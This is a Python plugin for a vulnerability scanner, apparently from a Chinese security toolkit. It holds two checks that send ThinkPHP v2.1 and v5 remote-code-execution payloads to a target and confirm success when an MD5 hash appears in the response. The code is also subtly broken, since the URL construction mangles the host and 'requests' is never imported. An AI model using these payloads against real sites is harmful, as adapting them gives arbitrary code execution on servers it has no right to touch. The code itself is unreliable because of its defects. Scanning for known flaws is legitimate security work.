#!/usr/bin/env python3
# encoding=utf-8
#codeby     道长且阻
#email      @ydhcui/QQ664284092

from core.plugin import BaseWebPlugin,BaseHostPlugin

class thinkphp_v21_rce(BaseWebPlugin):
    bugname = "thinkphpv2.1远程代码执行漏洞"
    bugrank = "高危"

    def filter(self,web):
        return 'thinkphp' in web.content or 'thinkphp' in web.xpoweredby

    def verify(self,web, user='', pwd='',timeout=10):
        try:
            url = '/'.join(web.url.split('/')[2]) + "/index.php/module/action/param1/${@print(md5(666))}"
            response = requests.get(url).text
            if "fae0b27c451c728867a567e8c1bb4e53" in response:
                self.bugaddr = url
                self.bugreq = url
                self.bugres = response
                return True
        except Exception as e:
            print(e)

class thinkphp_v5_rce(BaseWebPlugin):
    bugname = "thinkphpv5远程代码执行漏洞"
    bugrank = "高危"

    def filter(self,web):
        return 'thinkphp' in web.content or 'thinkphp' in web.xpoweredby

    def verify(self,web, user='', pwd='',timeout=10):
        try:
            url = '/'.join(web.url.split('/')[2]) + "/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=666"
            response = requests.get(url).text
            if "fae0b27c451c728867a567e8c1bb4e53" in response:
                self.bugaddr = url
                self.bugreq = url
                self.bugres = response
                return True
        except Exception as e:
            print(e)